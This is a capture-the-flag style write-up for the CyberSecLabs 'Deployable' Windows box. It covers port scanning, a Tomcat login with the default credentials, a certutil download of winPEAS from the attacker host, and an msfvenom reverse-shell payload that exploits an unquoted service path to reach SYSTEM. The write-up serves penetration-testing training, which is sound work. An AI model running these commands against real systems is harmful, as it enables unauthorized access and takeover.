# CyberSecLabs : Deployable 172.31.1.13

Nmap scans

```zsh
nmap -sS -Pn -p- -r 172.31.1.13 -v

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49164/tcp open  unknown
49165/tcp open  unknown
```

Services and Default script scan

```zsh
 nmap -sC -sV -p 135,139,445,3389,5985,8009,8080,47001,49152,49153,49154,49155,49156,49164,49165 172.31.1.13
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 03:13 EDT
Nmap scan report for 172.31.1.13
Host is up (0.16s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-05-20T07:15:04+00:00; +2s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0 
|_http-title: Not Found
8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http               Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0 
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
|_nbstat: NetBIOS name: DEPLOYABLE, NetBIOS user: <unknown>, NetBIOS MAC: 02:a6:2e:ac:ff:3a (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-20T07:14:58
|_  start_date: 2020-05-20T06:50:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.33 seconds


```

Went to port 8080 , default creds worked for ```TOMCAT``` login with user - ```tomcat``` and pass - ```s3cret``` which also appears in the error message.

Now grab the user flag simple.

For the Privesc, ```SeImpersonateToken``` is enabled but Juicy Potato will not work.

Uploaded winPEASany.exe using certutil
```zsh
certutil -urlcache -split -f http://10.10.0.40:80/winPEASany.exe 
```
Ran a winPEASany.exe

And saw Unquoted Service Path. 

```C:\Program Files\Deploy Ready\Service Files\Deploy.exe```

Simply used msfvenom to make a reverse.exe 

```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.40 LPORT=4445 -f exe -o Service.exe
```

Uploaded it using certutil, uploade accesschk.exe and sc to check the path
```cmd
C:\Users\tomcat\AppData\Local\Temp>sc qc Deploy
sc qc Deploy
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Deploy
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Deploy Ready\Service Files\Deploy.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Deploy
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```cmd
C:\Users\tomcat\AppData\Local\Temp>sc query Deploy
sc query Deploy

SERVICE_NAME: Deploy 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
```

we can see that by hit and trial we can go inside Deploy Ready but not Service Files, so I decided to name the reverse shell as Service.exe and started the service.

```cmd
net start Deploy
```
with another listener at 4445.

Now, I have system privileges.
